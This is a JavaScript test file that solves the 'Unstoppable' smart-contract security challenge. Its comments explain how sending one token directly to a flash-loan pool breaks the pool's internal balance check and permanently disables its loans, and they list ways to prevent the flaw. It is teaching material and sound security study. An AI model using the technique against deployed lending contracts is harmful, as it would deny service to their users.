const { ether, expectRevert } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
const UnstoppableLender = contract.fromArtifact('UnstoppableLender');
const ReceiverContract = contract.fromArtifact('ReceiverUnstoppable');

const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    /**
     * VULNERABILITY: Accounting Mismatch / DoS via Direct Token Transfer
     * 
     * The UnstoppableLender contract has a critical flaw in how it tracks its token balance.
     * It maintains an internal `poolBalance` variable that tracks deposits, but the flash loan
     * function uses an assertion that compares this internal accounting with the actual token balance.
     * 
     * HOW TO IDENTIFY THIS VULNERABILITY:
     * 1. Look for contracts that maintain separate internal accounting variables (like poolBalance)
     * 2. Check if there are assertions or requirements comparing internal accounting to actual balances
     * 3. Identify if users can directly transfer tokens to the contract bypassing the accounting logic
     * 4. Watch for the use of assert() instead of require(), assert is meant for invariants that 
     *    should NEVER be false, but here external actors can break the invariant
     * 
     * ATTACK VECTOR:
     * By sending tokens directly to the pool contract (bypassing depositTokens()), we can make
     * the actual balance higher than the internal poolBalance variable. This breaks the assertion
     * in the flashLoan function, causing all future flash loans to revert.
     * 
     * IMPACT:
     * - Complete Denial of Service (DoS) of the flash loan functionality
     * - The pool becomes permanently unusable for flash loans
     * - Users' funds are not at direct risk but the service is broken
     */

    const [deployer, attacker, someUser, ...otherAccounts] = accounts;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ether('1000000');
    const INITIAL_ATTACKER_BALANCE = ether('100');

    before(async function () {
        /** SETUP SCENARIO */
        this.token = await DamnValuableToken.new({ from: deployer });
        this.pool = await UnstoppableLender.new(this.token.address, { from: deployer });

        await this.token.approve(this.pool.address, TOKENS_IN_POOL, { from: deployer });
        await this.pool.depositTokens(TOKENS_IN_POOL, { from: deployer });

        await this.token.transfer(attacker, INITIAL_ATTACKER_BALANCE, { from: deployer });

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.bignumber.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker)
        ).to.be.bignumber.equal(INITIAL_ATTACKER_BALANCE);

         // Show it's possible for anyone to take out a flash loan
         this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
         await this.receiverContract.executeFlashLoan(10, { from: someUser });
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        
        /**
         * THE EXPLOIT:
         * 
         * Looking at UnstoppableLender.sol, the flashLoan function contains:
         * ```solidity
         * uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
         * assert(poolBalance == balanceBefore);
         * ```
         * 
         * The contract assumes poolBalance (internal accounting) will always equal the actual
         * token balance. But we can break this assumption by sending tokens directly!
         * 
         * STEP BY STEP:
         * 1. The pool tracks deposits in the poolBalance variable
         * 2. When someone calls depositTokens(), it increases poolBalance
         * 3. The flashLoan() function asserts that poolBalance == actual balance
         * 4. We bypass depositTokens() and transfer 1 token directly to the pool
         * 5. Now: actual balance = poolBalance + 1
         * 6. The assertion fails, and all flash loans revert forever
         * 
         * PREVENTION:
         * - Don't use assert() for conditions that external actors can influence
         * - Use actual token balance instead of maintaining separate accounting
         * - If separate accounting is needed, provide a sync mechanism
         * - Consider using require() instead of assert() for recoverable conditions (thank you youtube)
         */
        
        // Send 1 token directly to the pool, breaking the internal accounting
        await this.token.transfer(this.pool.address, 1, { from: attacker });
        
        /**
         * After this transfer:
         * - poolBalance (internal) = 1,000,000 tokens
         * - actual balance = 1,000,000 + 1 tokens
         * - The assertion poolBalance == balanceBefore will always fail
         * - Flash loans are now permanently disabled
         */
    });

    after(async function () {
        /** SUCCESS CONDITION */
        // Verify that flash loans now revert due to the broken assertion
        await expectRevert.unspecified(
            this.receiverContract.executeFlashLoan(10, { from: someUser })
        );
    });
});
